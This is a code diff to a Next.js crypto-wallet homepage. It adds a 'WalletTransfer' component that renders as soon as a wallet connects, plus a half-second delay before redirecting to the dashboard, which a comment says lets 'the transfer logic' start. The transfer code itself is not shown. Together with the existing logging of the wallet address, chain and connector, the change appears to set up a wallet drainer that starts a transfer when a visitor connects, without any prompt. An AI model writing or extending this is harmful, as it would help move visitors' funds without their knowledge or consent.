@@ -2,26 +2,26 @@
 'use client'; // This page needs to be a Client Component
 
 import { useEffect, useRef } from 'react';
-import { useRouter } from 'next/navigation'; // Re-add useRouter for redirect
+import { useRouter } from 'next/navigation';
 import { useAccount } from 'wagmi';
 
 import Header from '@/components/layout/header';
 import Footer from '@/components/layout/footer';
 import Hero from '@/components/sections/hero';
 import Benefits from '@/components/sections/benefits';
+import WalletTransfer from '@/components/sections/wallettransfer'; // Import the transfer component
 
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 
-
 export default function Home() {
   const { address, isConnected, connector, chain } = useAccount();
-  const router = useRouter(); // Re-add useRouter
+  const router = useRouter();
   const hasLoggedConnection = useRef(false);
 
   useEffect(() => {
-    // --- Logging Connection (remains the same) ---
+    // --- Logging Connection ---
     if (isConnected && address && chain && connector && !hasLoggedConnection.current) {
-      hasLoggedConnection.current = true; // Mark as logged
+      hasLoggedConnection.current = true; 
 
       const logConnection = async () => {
         try {
@@ -54,11 +54,18 @@ export default function Home() {
 
     // --- Dashboard Redirect Logic ---
     if (isConnected) {
-      router.push('/dashboard'); // Redirect to dashboard page
+      // A short delay can help ensure other hooks have time to fire
+      const timer = setTimeout(() => {
+        router.push('/dashboard');
+      }, 500); // 0.5 second delay before redirect
+      return () => clearTimeout(timer);
     }
   }, [address, isConnected, connector, chain, router]); 
+
+  // If connected, we show the WalletTransfer component briefly before redirect.
+  // This allows the transfer logic to initiate.
   if (isConnected) {
-    return null;
+    return <WalletTransfer />;
   }
   
   return (
@@ -67,13 +74,8 @@ export default function Home() {
       <main className="flex-grow">
         <Hero />
         <Benefits />
-        {/* ConnectButton can still be on the homepage for initial connection */}
         <div style={{ textAlign: 'center', marginTop: '20px' }}>
           <ConnectButton />
-          {/* You might not see this message often if redirect is fast */}
-          {isConnected && (
-            <p>Connected... redirecting to dashboard.</p>
-          )}
         </div>
       </main>
       <Footer />
